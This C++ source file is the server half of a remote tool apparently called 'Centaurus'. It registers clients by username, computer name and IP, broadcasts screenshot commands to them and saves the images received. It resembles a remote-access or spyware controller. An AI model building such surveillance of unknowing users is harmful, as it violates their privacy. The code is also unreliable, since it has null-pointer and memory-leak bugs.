#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <cstring>

#include "Server.h"

#include <fstream>

#include "Constants.h"

#pragma comment(lib, "ws2_32.lib")

Server::Server(u_short port)
    : m_port(port)
    , m_serverRunning(true)
{
    WSADATA wsData;
    WORD ver = MAKEWORD(2, 2);
    if (WSAStartup(ver, &wsData) != 0)
    {
        std::cerr << "Can't initialize Winsock! Quitting" << std::endl;
        stop();
    }

    m_listeningSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (m_listeningSocket == INVALID_SOCKET)
    {
        std::cerr << "Can't create a socket! Quitting" << std::endl;
        WSACleanup();
        stop();
    }

    sockaddr_in hint;
    hint.sin_family = AF_INET;
    hint.sin_port = htons(port);
    hint.sin_addr.s_addr = INADDR_ANY;

    if (bind(m_listeningSocket, (sockaddr*)&hint, sizeof(hint)) == SOCKET_ERROR)
    {
        std::cerr << "Can't bind socket! Quitting" << std::endl;
        closesocket(m_listeningSocket);
        WSACleanup();
        stop();
    }

    if (listen(m_listeningSocket, SOMAXCONN) == SOCKET_ERROR)
    {
        std::cerr << "Can't listen on socket! Quitting" << std::endl;
        closesocket(m_listeningSocket);
        WSACleanup();
        stop();
    }
}

Server::~Server() {
    stop();
}

/**
 * Начало сеанса.
 */
void Server::start() {
    std::thread acceptThread(&Server::acceptClients, this);
    std::thread commandThread(&Server::processCommands, this);
    acceptThread.join();
    commandThread.join();
}

/**
 * Завершение сеанса.
 */
void Server::stop() {
    m_serverRunning = false;

    for (SOCKET sock : m_clientSockets)
    {
        send(sock, "exit", 4, 0);
        closesocket(sock);
    }

    closesocket(m_listeningSocket);
    WSACleanup();
}

void Server::CopyReceivedString(const char* source, char* destination, size_t destSize) {
    if (source) {
        strncpy(destination, source, destSize - 1);
        destination[destSize - 1] = '\0';
    }
}

/**
 * Прослушка клиентов.
 * @param clientSocket Сокет клиента.
 */
void Server::handleClient(const SOCKET clientSocket) {
    FClientInfo clientInfo;

    while (m_serverRunning) {
        std::string command = receiveString(clientSocket);

        if (command == "/connect") {
            char* receivedTime = receiveString(clientSocket);
            char* receivedUser = receiveString(clientSocket);
            char* receivedName = receiveString(clientSocket);
            char* receivedIPv4 = receiveString(clientSocket);

            CopyReceivedString(receivedTime, clientInfo.time, sizeof(clientInfo.time));
            CopyReceivedString(receivedUser, clientInfo.user, sizeof(clientInfo.user));
            CopyReceivedString(receivedName, clientInfo.name, sizeof(clientInfo.name));
            CopyReceivedString(receivedIPv4, clientInfo.ipv4, sizeof(clientInfo.ipv4));
            
            std::cerr << "Client connected with the following info:\n";
            std::cerr << "Time: " << clientInfo.time << "\n";
            std::cerr << "Username: " << clientInfo.user << "\n";
            std::cerr << "Computer Name: " << clientInfo.name << "\n";
            std::cerr << "IP Address: " << clientInfo.ipv4 << "\n";
        }
        else if (command == Centaurus::cmd::screenshot) {
            std::cout << "Requesting screenshot..." << std::endl;

            // Получаем размер данных скриншота
            int dataSize;
            int sizeReceived = recv(clientSocket, reinterpret_cast<char*>(&dataSize), sizeof(dataSize), 0);
            if (sizeReceived == SOCKET_ERROR) {
                std::cerr << "Failed to receive size of screenshot, error: " << WSAGetLastError() << std::endl;
                break;
            }

            std::vector<char> screenshotData = receiveData(clientSocket, dataSize);
            if (screenshotData.empty()) return;
            
            // Сохраняем скриншот в файл
            std::string scnFileName = clientInfo.user;
            scnFileName.append("_");
            scnFileName.append(clientInfo.ipv4);
            scnFileName.append(".bmp");
            std::string outPath = CONTENT_PATH + '/' + scnFileName;
            std::ofstream outFile(outPath, std::ios::binary);
            outFile.write(screenshotData.data(), screenshotData.size());
            outFile.close();
            std::cout << "Screenshot saved as " << outPath << std::endl;
        }
    }

    closesocket(clientSocket);
}

std::vector<char> Server::receiveData(SOCKET clientSocket, int dataSize) {
    std::vector<char> buffer(dataSize);
    int totalBytesReceived = 0;
    
    while (totalBytesReceived < dataSize) {
        int bytesRead = recv(clientSocket, buffer.data() + totalBytesReceived, dataSize - totalBytesReceived, 0);
        if (bytesRead == SOCKET_ERROR) {
            std::cerr << "Error receiving data, error: " << WSAGetLastError() << std::endl;
            return {};
        }
        totalBytesReceived += bytesRead;
    }
    
    return buffer;
}

char* Server::receiveString(SOCKET clientSocket) {
    int strSize;
    int sizeReceived = recv(clientSocket, reinterpret_cast<char*>(&strSize), sizeof(strSize), 0);
    if (sizeReceived == SOCKET_ERROR) {
        std::cerr << "Failed to receive string size, error: " << WSAGetLastError() << std::endl;
        return nullptr;
    }

    std::vector<char> stringData = receiveData(clientSocket, strSize);
    if (stringData.empty()) {
        return nullptr;
    }

    char* buffer = new char[strSize + 1];
    std::copy(stringData.begin(), stringData.end(), buffer);
    buffer[strSize] = '\0';

    return buffer;
}


/**
 * Прослушка новых клиентов.
 */
void Server::acceptClients() {
    while (m_serverRunning)
    {
        sockaddr_in client;
        int clientSize = sizeof(client);
        SOCKET clientSocket = accept(m_listeningSocket, (sockaddr*)&client, &clientSize);

        if (clientSocket == INVALID_SOCKET)
        {
            std::cerr << "Invalid client socket" << std::endl;
            continue;
        }

        m_clientSockets.push_back(clientSocket);
        m_clientThreads.emplace_back(&Server::handleClient, this, clientSocket);
    }
}

/**
 * Реализация команд сервера.
 */
void Server::processCommands() {
    std::string command;
    while (m_serverRunning)
    {
        std::cin >> command;

        if (command == Centaurus::cmd::screenshot)
        {
            for (SOCKET sock : m_clientSockets)
            {
                send(sock, command.c_str(), command.size() + 1, 0);
            }
        }
        else if (command == Centaurus::cmd::list)
        {
            std::cout << "Connected clients:" << '\n';
            // for (const auto& ip : m_clientIPs) {
            //     std::cout << ip << std::endl;
            // }
        }
        else if (command == Centaurus::cmd::exit || command == Centaurus::cmd::quit)
        {
            stop();
        }
        else if (command == Centaurus::cmd::help)
        {
            std::cout << Centaurus::cmd::helpMsg << std::endl;
        }
        else
        {
            std::cerr << Centaurus::cmd::unknownMsg << std::endl;
        }
    }
}